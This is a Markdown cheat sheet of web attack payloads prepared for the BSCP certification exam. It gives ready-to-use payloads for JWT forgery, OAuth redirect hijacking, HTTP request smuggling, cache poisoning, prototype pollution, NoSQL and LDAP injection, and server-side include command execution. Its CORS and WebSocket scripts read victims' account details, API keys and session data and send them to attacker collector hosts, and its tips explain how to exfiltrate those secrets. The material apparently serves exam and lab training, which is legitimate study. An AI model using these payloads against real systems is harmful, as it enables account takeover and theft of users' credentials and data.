# Additional BSCP Exam Techniques

## JWT Attacks

### JWT Algorithm Confusion (None Algorithm)
```json
{
  "alg": "none",
  "typ": "JWT"
}
```

**Payload:**
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0.
```

**Note:** Signature is empty (ends with just a dot)

---

### JWT Algorithm Confusion (HS256 to RS256)
**Steps:**
1. Extract public key from `/jwks.json` or `/.well-known/jwks.json`
2. Convert to PEM format
3. Sign JWT with public key using HS256
4. Change `alg` to `RS256`

---

### JWT Header Injection (jku)
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://exploit-server.com/jwks.json"
}
```

**Host malicious JWKS:**
```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "your-key-id",
      "n": "your-public-key-modulus"
    }
  ]
}
```

---

## OAuth Attacks

### OAuth Account Hijacking via redirect_uri
```
https://oauth-server.com/auth?client_id=CLIENT&redirect_uri=https://exploit-server.com&response_type=code&scope=openid%20profile%20email
```

---

### OAuth State Parameter CSRF
Remove `state` parameter from OAuth flow to enable CSRF

---

## HTTP Request Smuggling

### CL.TE Smuggling
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

---

### TE.CL Smuggling
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

---

## Web Cache Poisoning

### Cache Key Injection
```http
GET /?utm_content=x HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: exploit-server.com
```

---

### Unkeyed Header Exploitation
```http
GET / HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Scheme: nothttps
```

---

## CORS Attacks

### CORS Account Details Exfiltration
**Context:** CORS misconfiguration allows reading sensitive endpoints with credentials

```html
<script>
var req = new XMLHttpRequest();

req.onload = sendAPI;
req.withCredentials = true;
req.open('GET','https://TARGET/accountDetails',true);
req.send();

function sendAPI(){
  location='https://COLLAB.oastify.com?api='+btoa(req.responseText);
};
</script>
```

**How it works:**
1. `XMLHttpRequest` makes request to `/accountDetails`
2. `withCredentials: true` sends victim's cookies
3. `onload` callback executes when response received
4. `btoa()` base64-encodes the response
5. Redirects to attacker server with encoded data
6. Attacker decodes base64 to read account details

**Common sensitive endpoints to try:**
- `/accountDetails` - Account information, API keys
- `/my-account` - User profile, email, settings
- `/api/user` - User data, session info
- `/api/keys` - API keys, tokens
- `/admin/users` - Admin panel data
- `/settings` - Configuration, secrets
- `/profile` - Personal information
- `/api/session` - Session details

**Why these endpoints matter:**
- May contain API keys for privilege escalation
- Session tokens for account takeover
- Email addresses for further attacks
- Admin credentials or secrets
- Internal system information

**Decode exfiltrated data:**
```javascript
atob('base64_encoded_data')
```

---

### CORS with Null Origin
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://TARGET/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='https://COLLAB.oastify.com/log?key='+this.responseText;
};
</script>"></iframe>
```

**How it works:**
- `sandbox` iframe has `null` origin
- Some CORS configs allow `null` origin
- Bypasses origin-based restrictions

---

### CORS with Subdomain
```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://TARGET/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='https://COLLAB.oastify.com/log?key='+encodeURIComponent(this.responseText);
};
```

**Host on subdomain:**
- `attacker.target.com` if CORS allows `*.target.com`
- Bypasses same-origin restrictions

---

### CORS Endpoint Discovery

**Test these endpoints for CORS misconfiguration:**
```
/accountDetails
/my-account
/api/user
/api/keys
/api/session
/api/profile
/admin/users
/settings
/config
/api/admin
```

**Check for CORS headers:**
```http
GET /accountDetails HTTP/1.1
Host: target.com
Origin: https://evil.com
```

**Look for response:**
```http
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

**If present:** Endpoint is vulnerable to CORS attack

---

### Exam Tips - CORS

1. **Always check `/accountDetails`** - Most common vulnerable endpoint
2. **Use base64 encoding** - `btoa()` for clean exfiltration
3. **Try multiple endpoints** - `/api/user`, `/my-account`, `/settings`
4. **Check for API keys** - Often in account details response
5. **Use `withCredentials: true`** - Required to send cookies
6. **Test null origin** - Use sandbox iframe
7. **Look for session data** - May contain admin tokens

---

## Prototype Pollution

### Client-Side Prototype Pollution
```
/?__proto__[transport_url]=data:,alert(1);//
```

---

### Server-Side Prototype Pollution
```json
{
  "__proto__": {
    "isAdmin": true
  }
}
```

---

## Host Header Attacks

### Password Reset Poisoning
```http
POST /forgot-password HTTP/1.1
Host: exploit-server.com
```

---

### Host Header with Absolute URL
```http
GET https://TARGET/admin HTTP/1.1
Host: localhost
```

---

## Information Disclosure

### Backup File Discovery
```
/.git/
/backup/
/.DS_Store
/robots.txt
/.svn/
/admin.bak
/config.php.bak
```

---

### Error-Based Information Disclosure
```
?debug=1
?test=1
?admin=1
```

---

## Business Logic Vulnerabilities

### Price Manipulation
```
price=-100
quantity=-1
```

---

### Workflow Bypass
Skip steps in multi-step process by directly accessing final step

---

## Race Conditions

### Limit Overrun
Send multiple parallel requests to bypass rate limiting:
```python
import requests
import threading

def send_request():
    requests.post('https://TARGET/endpoint', data={'amount': 100})

threads = []
for i in range(20):
    t = threading.Thread(target=send_request)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

---

## WebSockets

### WebSocket CSWSH (Cross-Site WebSocket Hijacking)
```html
<script>
var ws = new WebSocket('wss://TARGET/chat');
ws.onopen = function() {
    ws.send("READY");
};
ws.onmessage = function(event) {
    fetch('https://exploit-server.com/?'+event.data);
};
</script>
```

---

## GraphQL

### GraphQL Introspection
```graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

---

### GraphQL Mutation
```graphql
mutation {
  deleteUser(id: "1") {
    success
  }
}
```

---

## Insecure Direct Object References (IDOR)

### UUID IDOR
```
/api/user/550e8400-e29b-41d4-a716-446655440000
```

Try sequential UUIDs or predictable patterns

---

### Encoded IDOR
```
/api/user/dXNlcjE=  (base64: user1)
```

---

## Server-Side Includes (SSI)

### SSI Injection
```
<!--#exec cmd="cat /home/carlos/secret" -->
```

---

## LDAP Injection

### LDAP Authentication Bypass
```
*
admin*
*)(uid=*))(|(uid=*
```

---

## NoSQL Injection

### MongoDB Authentication Bypass
```json
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
```

---

### MongoDB Operator Injection
```
username[$ne]=admin&password[$ne]=password
```

---

## XML Injection

### SOAP Injection
```xml
<soap:Envelope>
  <soap:Body>
    <getUser>
      <username>admin' or '1'='1</username>
    </getUser>
  </soap:Body>
</soap:Envelope>
```
